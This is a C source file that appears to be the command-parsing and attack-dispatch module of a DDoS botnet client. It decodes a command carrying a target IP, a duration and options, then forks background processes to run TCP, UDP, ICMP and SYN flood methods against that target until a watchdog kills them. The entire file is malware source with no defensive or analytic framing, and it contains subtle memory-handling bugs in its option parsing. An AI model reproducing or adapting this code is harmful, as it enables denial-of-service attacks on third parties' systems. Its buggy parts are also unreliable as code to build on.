#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "methods.h"
#include "utils.h"
#include "attacks.h"

struct attack_method_t *attacks;
int attack_methods = 0;

char *attacks_option_string(char *opts, uint8_t id, int *len, int opts_len)
{
	int opts_pos = 0;
	char *string;

	while (opts_pos < opts_len)
	{
		uint8_t opt_id, opt_type, opt_len;

		utils_memcpy(&opt_id, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		utils_memcpy(&opt_type, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		switch (opt_type)
		{
			case TYPE_UINT8:
			{
				opts_pos += sizeof(uint8_t);
			}
			break;

			case TYPE_UINT16:
			{
				opts_pos += sizeof(uint16_t);
			}
			break;

			case TYPE_UINT32:
			{
				opts_pos += sizeof(uint32_t);
			}
			break;

			case TYPE_STRING:
			{
				if (opt_id == id)
				{
					utils_memcpy(&opt_len, opts + opts_pos, sizeof(uint8_t));
					opts_pos += sizeof(uint8_t);

					string = malloc(opt_len * sizeof(char *));
					if (!string)
						return NULL;

					utils_memset(string, 0, sizeof(string));
					utils_memcpy(string, opts + opts_pos, opt_len);

					if (len != NULL)
						*len = opt_len;

					return string;
				}

				utils_memcpy(&opt_len, opts + opts_pos, sizeof(uint8_t));
				opts_pos += sizeof(uint8_t);
				opts_pos += opt_len;
			}
			break;

			default:
				break;
		}
	}
	
	return NULL;
}

uint8_t attacks_option_uint8(char *opts, uint8_t id, int opts_len)
{
	int opts_pos = 0;
	
	while (opts_pos < opts_len)
	{
		uint8_t opt_id, opt_type, opt_len;

		utils_memcpy(&opt_id, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		utils_memcpy(&opt_type, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		switch (opt_type)
		{
			case TYPE_UINT8:
			{
				if (opt_id == id)
				{
					uint8_t val;
					utils_memcpy(&val, opts + opts_pos, sizeof(uint8_t));
					return val;
				}

				opts_pos += sizeof(uint8_t);
			}
			break;

			case TYPE_UINT16:
			{
				opts_pos += sizeof(uint16_t);
			}
			break;

			case TYPE_UINT32:
			{
				opts_pos += sizeof(uint32_t);
			}
			break;

			case TYPE_STRING:
			{
				utils_memcpy(&opt_len, opts + opts_pos, sizeof(uint8_t));
				opts_pos += sizeof(uint8_t);
				opts_pos += opt_len;
			}
			break;

			default:
				break;
		}
	}
	
	return 0xFF;	
}

uint16_t attacks_option_uint16(char *opts, uint8_t id, int opts_len)
{
	int opts_pos = 0;
		
	while (opts_pos < opts_len)
	{
		uint8_t opt_id, opt_type, opt_len;

		utils_memcpy(&opt_id, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		utils_memcpy(&opt_type, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		switch (opt_type)
		{
			case TYPE_UINT8:
			{
				opts_pos += sizeof(uint8_t);
			}
			break;

			case TYPE_UINT16:
			{
				if (opt_id == id)
				{
					uint16_t val;
					utils_memcpy(&val, opts + opts_pos, sizeof(uint16_t));
					val = ntohs(val);
					return val;
				}

				opts_pos += sizeof(uint16_t);
			}
			break;

			case TYPE_UINT32:
			{
				opts_pos += sizeof(uint32_t);
			}
			break;

			case TYPE_STRING:
			{
				utils_memcpy(&opt_len, opts + opts_pos, sizeof(uint8_t));
				opts_pos += sizeof(uint8_t);
				opts_pos += opt_len;
			}
			break;

			default:
				break;
		}
	}
	
	return 0xFFFF;	
}

uint32_t attacks_option_uint32(char *opts, uint8_t id, int opts_len)
{
	int opts_pos = 0;
	
	while (opts_pos < opts_len)
	{
		uint8_t opt_id, opt_type, opt_len;

		if (opts + opts_pos == 0x00)
			break;

		utils_memcpy(&opt_id, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		utils_memcpy(&opt_type, opts + opts_pos, sizeof(uint8_t));
		opts_pos += sizeof(uint8_t);

		switch (opt_type)
		{
			case TYPE_UINT8:
			{
				opts_pos += sizeof(uint8_t);
			}
			break;

			case TYPE_UINT16:
			{
				opts_pos += sizeof(uint16_t);
			}
			break;

			case TYPE_UINT32:
			{
				if (opt_id == id)
				{
					uint32_t val;
					utils_memcpy(&val, opts + opts_pos, sizeof(uint32_t));
					val = ntohl(val);
					return val;
				}

				opts_pos += sizeof(uint32_t);
			}
			break;

			case TYPE_STRING:
			{
				utils_memcpy(&opt_len, opts + opts_pos, sizeof(uint8_t));
				opts_pos += sizeof(uint8_t);
				opts_pos += opt_len;
			}
			break;

			default:
				break;
		}
	}
	
	return 0xFFFFFFFF;	
}

static void attacks_start(uint8_t id, uint32_t target, uint16_t duration, char *opts, int opts_len)
{
	int pid1, pid2, i;

    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;

    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    {
        sleep(duration);
        signal(SIGCHLD, SIG_IGN);
        kill(getppid(), 9);
        exit(0);
    }
	else
	{
		for (i = 0; i < attack_methods; i++)
		{
			if (attacks[i].id == id)
			{
				attacks[i].func(target, opts, opts_len);
				sleep(duration + 5);
			}
		}

		sleep(duration + 5);
	}
}

static void attacks_add(uint8_t id, ATTACKS_FUNC func)
{
	attacks = (struct attack_method_t *)realloc(attacks, (attack_methods + 1) * sizeof(struct attack_method_t));
	attacks[attack_methods].id = id;
	attacks[attack_methods].func = func;
	attack_methods++;
}

void attacks_init(void)
{
	attacks_add(METHOD_TCP, (ATTACKS_FUNC)methods_tcp);
	attacks_add(METHOD_UDP, (ATTACKS_FUNC)methods_udp);
	attacks_add(METHOD_ICMP, (ATTACKS_FUNC)methods_icmp);
	attacks_add(METHOD_SYN, (ATTACKS_FUNC)methods_syn);
}

void attacks_parse(char *buffer, int buffer_len)
{
	uint8_t id, o1, o2, o3, o4;
	uint16_t duration;
	int str_len = 0;

	utils_memcpy(&id, buffer, sizeof(uint8_t));
	str_len += sizeof(uint8_t);

	utils_memcpy(&o1, buffer + str_len, sizeof(uint8_t));
	str_len += sizeof(uint8_t);
	utils_memcpy(&o2, buffer + str_len, sizeof(uint8_t));
	str_len += sizeof(uint8_t);
	utils_memcpy(&o3, buffer + str_len, sizeof(uint8_t));
	str_len += sizeof(uint8_t);
	utils_memcpy(&o4, buffer + str_len, sizeof(uint8_t));

	str_len += sizeof(uint8_t);
	utils_memcpy(&duration, buffer + str_len, sizeof(uint16_t));
	str_len += sizeof(uint16_t);
	duration = ntohs(duration);

	if (buffer_len - str_len <= 0)
		attacks_start(id, INET_ADDR(o1,o2,o3,o4), duration, NULL, 0);
	else
		attacks_start(id, INET_ADDR(o1,o2,o3,o4), duration, buffer + str_len, buffer_len - str_len);
}
